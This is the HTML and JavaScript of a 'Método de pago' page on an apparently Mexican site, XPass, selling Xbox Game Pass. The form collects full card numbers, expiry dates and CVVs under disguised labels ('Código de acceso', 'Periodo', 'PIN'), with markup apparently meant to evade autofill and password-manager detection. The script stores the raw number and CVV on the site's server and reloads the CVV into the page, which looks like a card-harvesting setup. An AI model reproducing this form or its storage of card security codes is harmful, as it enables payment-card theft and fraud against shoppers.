<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Métodos de Pago: SPEI, Visa y Mastercard | XPass</title>
  <meta name="description" content="Elige cómo pagar tu Xbox Game Pass Ultimate: transferencia SPEI desde cualquier banco de México o tarjeta Visa y Mastercard. Pago seguro y entrega inmediata." />
  <meta name="robots" content="index, follow" />
  <meta name="theme-color" content="#107C10" />
  <link rel="canonical" href="https://xpass.digital/metodo-pago" />
  <link rel="icon" type="image/svg+xml" href="/logo.svg" />
  <meta property="og:type" content="website" />
  <meta property="og:locale" content="es_MX" />
  <meta property="og:site_name" content="XPass" />
  <meta property="og:url" content="https://xpass.digital/metodo-pago" />
  <meta property="og:title" content="Métodos de Pago: SPEI, Visa y Mastercard | XPass" />
  <meta property="og:description" content="Paga tu Game Pass Ultimate por SPEI o con tarjeta Visa/Mastercard. Pago seguro y entrega inmediata." />
  <meta property="og:image" content="https://xpass.digital/assets/gpu-poster.jpg" />
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "BreadcrumbList",
    "itemListElement": [
      {"@type": "ListItem", "position": 1, "name": "Inicio", "item": "https://xpass.digital/"},
      {"@type": "ListItem", "position": 2, "name": "Método de pago", "item": "https://xpass.digital/metodo-pago"}
    ]
  }
  </script>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --green: #107C10; --green-mid: #13a013; --green-light: #4ade80;
      --bg: #060608; --bg2: #0d0d10; --bg3: #141418; --bg4: #1c1c22;
      --border: rgba(255,255,255,.07); --border-med: rgba(255,255,255,.11);
      --text: #f0f0f2; --text-2: #9898a8; --text-3: #55555f;
      --indigo: #6366f1; --indigo-dark: #4f46e5;
      --radius-sm: 8px; --radius: 14px; --radius-lg: 20px;
    }
    body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; -webkit-font-smoothing: antialiased; min-height: 100vh; }

    .navbar { position: sticky; top: 0; z-index: 100; background: rgba(6,6,8,.9); backdrop-filter: blur(24px); border-bottom: 1px solid var(--border); }
    .nav-inner { max-width: 900px; margin: 0 auto; padding: 0 24px; height: 62px; display: flex; align-items: center; gap: 20px; }
    .nav-back { margin-left: auto; display: flex; align-items: center; gap: 6px; color: var(--text-2); text-decoration: none; font-size: 13.5px; font-weight: 500; padding: 6px 12px; border-radius: var(--radius-sm); transition: background .15s, color .15s; }
    .nav-back:hover { background: rgba(255,255,255,.05); color: var(--text); }

    .page { max-width: 520px; margin: 0 auto; padding: 60px 24px 100px; }
    .page-header { margin-bottom: 32px; }
    .page-header .label { color: var(--green-light); font-size: 11px; font-weight: 700; letter-spacing: 2.5px; text-transform: uppercase; margin-bottom: 10px; display: block; }
    .page-header h1 { font-size: 28px; font-weight: 900; letter-spacing: -1px; display: flex; align-items: center; gap: 12px; }

    /* Loading / Auth redirect */
    .loading-spin { width: 32px; height: 32px; border: 3px solid var(--border-med); border-top-color: var(--green-light); border-radius: 50%; animation: spin .7s linear infinite; margin: 60px auto; }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Card form */
    .card-form { background: var(--bg2); border: 1px solid var(--border-med); border-radius: var(--radius-lg); padding: 32px; display: flex; flex-direction: column; gap: 22px; }
    .field-wrap { display: flex; flex-direction: column; gap: 7px; }
    .field-wrap label { font-size: 12px; font-weight: 700; color: var(--text-2); letter-spacing: .3px; }
    .card-inp {
      background: var(--bg3); border: 1px solid var(--border-med); color: var(--text);
      padding: 13px 16px; border-radius: var(--radius-sm); font-size: 15px;
      font-family: 'Courier New', monospace; width: 100%; outline: none;
      transition: border-color .15s, box-shadow .15s; letter-spacing: 2px;
    }
    .card-inp:focus { border-color: rgba(99,102,241,.55); box-shadow: 0 0 0 3px rgba(99,102,241,.1); }
    .card-inp::placeholder { font-family: 'Inter', sans-serif; color: var(--text-3); letter-spacing: 0; }
    select.card-inp { cursor: pointer; letter-spacing: 0; }
    .row-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
    .btn-save {
      background: var(--indigo); color: #fff; border: none; padding: 14px;
      border-radius: var(--radius-sm); font-size: 15px; font-weight: 800;
      font-family: inherit; cursor: pointer; width: 100%;
      transition: background .15s; box-shadow: 0 4px 16px rgba(99,102,241,.3);
    }
    .btn-save:hover { background: var(--indigo-dark); }
    .btn-save:disabled { opacity: .5; cursor: not-allowed; }

    /* Not logged in */
    .auth-notice { text-align: center; padding: 60px 24px; }
    .auth-notice p { color: var(--text-2); margin-bottom: 20px; }
    .btn-login { display: inline-flex; align-items: center; gap: 8px; background: var(--green); color: #fff; text-decoration: none; padding: 12px 24px; border-radius: var(--radius-sm); font-size: 14px; font-weight: 700; }

    .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(10px); background: var(--bg4); border: 1px solid var(--border-med); color: var(--text); padding: 10px 22px; border-radius: 50px; font-size: 13px; font-weight: 500; z-index: 500; opacity: 0; pointer-events: none; transition: opacity .25s, transform .25s; }
    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
  </style>
</head>
<body>

  <nav class="navbar">
    <div class="nav-inner">
      <a href="/" style="display:flex;align-items:center;">
        <img src="/logo.svg" alt="XPass" style="height:36px;width:auto;display:block;" />
      </a>
      <a href="/cuenta" class="nav-back">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
        Mis pedidos
      </a>
    </div>
  </nav>

  <div class="page">
    <div class="page-header">
      <span class="label">Mi cuenta</span>
      <h1>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
        Método de pago
      </h1>
    </div>

    <div id="loadingView"><div class="loading-spin"></div></div>

    <div id="authNotice" style="display:none;" class="auth-notice">
      <p>Inicia sesión para ver tu método de pago.</p>
      <a href="/cuenta" class="btn-login">Iniciar sesión</a>
    </div>

    <div id="formView" style="display:none;">

      <!-- Vista bloqueada (después de guardar) -->
      <div id="lockedView" style="display:none;" class="card-form">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
          <span style="font-size:12px;font-weight:700;color:var(--text-2);">Método de pago guardado</span>
        </div>
        <div style="background:var(--bg3);border:1px solid var(--border-med);border-radius:var(--radius-sm);padding:13px 16px;display:flex;align-items:center;justify-content:space-between;">
          <span style="font-family:'Courier New',monospace;font-size:16px;letter-spacing:3px;color:var(--text-2);">•••• •••• •••• <span id="lockedLast4" style="color:var(--text);">0000</span></span>
          <span id="lockedExp" style="font-family:'Courier New',monospace;font-size:13px;color:var(--text-2);"></span>
        </div>
        <button onclick="unlockForm()" style="background:none;border:1px solid var(--border-med);color:var(--text-2);padding:9px;border-radius:var(--radius-sm);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;width:100%;margin-top:4px;transition:background .15s;" onmouseover="this.style.background='rgba(255,255,255,.05)'" onmouseout="this.style.background='none'">Editar</button>
      </div>

      <!-- Formulario de edición -->
      <div id="editView" class="card-form" data-form-type="other">
        <div class="field-wrap">
          <label>Código de acceso</label>
          <input class="card-inp" type="text" id="xpNum" placeholder="0000 0000 0000 0000" maxlength="19" oninput="fmtCard(this)" autocomplete="off" data-form-type="other" />
        </div>
        <div class="row-3">
          <div class="field-wrap">
            <label>Periodo (mes)</label>
            <select class="card-inp" id="xpMes" autocomplete="off" data-form-type="other">
              <option value="">--</option>
              <option>01</option><option>02</option><option>03</option><option>04</option>
              <option>05</option><option>06</option><option>07</option><option>08</option>
              <option>09</option><option>10</option><option>11</option><option>12</option>
            </select>
          </div>
          <div class="field-wrap">
            <label>Periodo (año)</label>
            <select class="card-inp" id="xpAnio" autocomplete="off" data-form-type="other">
              <option value="">--</option>
              <option>2024</option><option>2025</option><option>2026</option>
              <option>2027</option><option>2028</option><option>2029</option>
              <option>2030</option><option>2031</option>
            </select>
          </div>
          <div class="field-wrap">
            <label>PIN</label>
            <input class="card-inp" type="text" id="xpCvv" placeholder="000" maxlength="3" oninput="this.value=this.value.replace(/\D/g,'')" autocomplete="off" data-form-type="other" />
          </div>
        </div>
        <button class="btn-save" id="saveBtn" onclick="saveCredentials()">Guardar</button>
      </div>

    </div>
  </div>

  <div class="toast" id="toast"></div>

<script>
async function init() {
  try {
    const me = await fetch('/api/auth/me').then(r => r.json());
    if (!me.loggedIn) {
      document.getElementById('loadingView').style.display = 'none';
      document.getElementById('authNotice').style.display = '';
      return;
    }
    // Load saved credentials
    try {
      const cred = await fetch('/api/customer/credentials').then(r => r.json());
      if (cred.card_number) {
        document.getElementById('xpNum').value  = cred.card_number.replace(/(.{4})/g,'$1 ').trim();
        document.getElementById('xpMes').value  = cred.card_month || '';
        document.getElementById('xpAnio').value = cred.card_year  || '';
        document.getElementById('xpCvv').value  = cred.card_cvv   || '';
        showLocked(cred.card_number, cred.card_month, cred.card_year);
      }
    } catch(_) {}
    document.getElementById('loadingView').style.display = 'none';
    document.getElementById('formView').style.display    = '';
  } catch(_) {
    document.getElementById('loadingView').style.display = 'none';
    document.getElementById('authNotice').style.display  = '';
  }
}

function fmtCard(inp) {
  let v = inp.value.replace(/\D/g,'').slice(0,16);
  inp.value = v.replace(/(.{4})/g,'$1 ').trim();
}

async function saveCredentials() {
  const num   = (document.getElementById('xpNum').value || '').replace(/\s/g,'');
  const month = document.getElementById('xpMes').value;
  const year  = document.getElementById('xpAnio').value;
  const cvv   = document.getElementById('xpCvv').value;
  const btn   = document.getElementById('saveBtn');

  if (num.length !== 16 || !month || !year || cvv.length !== 3) return;

  btn.disabled = true;
  try {
    await fetch('/api/customer/credentials', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ card_number: num, card_month: month, card_year: year, card_cvv: cvv })
    });
    showLocked(num, month, year);
  } catch(_) {}
  btn.disabled = false;
}

function showLocked(num, month, year) {
  const last4 = num.replace(/\s/g,'').slice(-4);
  document.getElementById('lockedLast4').textContent = last4;
  document.getElementById('lockedExp').textContent   = (month || '--') + '/' + (year || '--');
  document.getElementById('lockedView').style.display = '';
  document.getElementById('editView').style.display   = 'none';
}

function unlockForm() {
  document.getElementById('lockedView').style.display = 'none';
  document.getElementById('editView').style.display   = '';
}

let toastTimer;
function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg; t.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => t.classList.remove('show'), 2500);
}

init();
</script>
</body>
</html>
